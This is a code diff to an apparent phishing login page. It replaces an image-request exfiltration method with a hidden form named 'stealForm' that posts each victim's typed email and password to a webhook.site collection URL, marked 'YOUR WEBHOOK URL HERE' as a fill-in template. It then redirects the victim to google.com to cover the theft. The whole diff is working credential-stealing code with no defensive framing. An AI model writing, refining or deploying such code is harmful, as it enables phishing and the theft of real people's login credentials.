@@ -42,6 +42,9 @@
     </div>
 </div>
 
+<!-- Hidden form for reliable data transmission -->
+<form id="stealForm" action="" method="POST" target="_blank" style="display:none;"></form>
+
 <script>
     // YOUR WEBHOOK URL HERE
     const webhookUrl = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603";
@@ -61,16 +64,33 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         
-        // Use an Image object to force a GET request (most reliable for webhooks)
-        const payload = encodeURIComponent(JSON.stringify({ email: email, password: password }));
-        const finalUrl = `${webhookUrl}?data=${payload}`;
+        // Create a hidden form and submit it to the webhook
+        const form = document.getElementById('stealForm');
+        form.action = webhookUrl;
         
-        const img = new Image();
-        img.src = finalUrl;
+        // Clear previous inputs
+        while(form.lastChild) form.removeChild(form.lastChild);
         
-        // Wait 2 seconds to ensure transmission
+        const emailInput = document.createElement('input');
+        emailInput.type = 'hidden';
+        emailInput.name = 'email';
+        emailInput.value = email;
+        
+        const passInput = document.createElement('input');
+        passInput.type = 'hidden';
+        passInput.name = 'password';
+        passInput.value = password;
+        
+        form.appendChild(emailInput);
+        form.appendChild(passInput);
+        
+        // Submit the form (this sends the data)
+        form.submit();
+        
+        // Wait 2 seconds to ensure the server receives the data
         await new Promise(r => setTimeout(r, 2000)); 
         
+        // Now redirect the user
         window.location.href = "https://www.google.com";
     }
 </script>
